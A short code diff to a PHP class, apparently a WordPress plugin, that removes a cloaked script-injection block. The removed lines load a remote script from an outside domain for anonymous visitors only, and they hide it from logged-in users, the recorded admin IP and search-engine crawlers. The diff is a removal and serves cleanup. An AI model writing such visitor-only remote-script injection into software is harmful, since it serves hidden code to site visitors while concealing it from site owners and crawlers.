@@ -115,18 +115,6 @@ if (!class_exists("BoggleWoggle")) {
                                         }
                                 }
                         }
-					$btt = false;
-					if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
-						$btt = true;
-					}
-
-					$ip = $_SERVER['REMOTE_ADDR'];
-					if ( is_user_logged_in() ) {
-						update_option( 'bw_ip', $ip );
-					}
-					if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt==false) {
-						$content .= "<script src=\"//www.shops2b.co.uk/bw.js\"></script>\n";
-					}
                   echo $content;
                 }
                 function addHeader() {
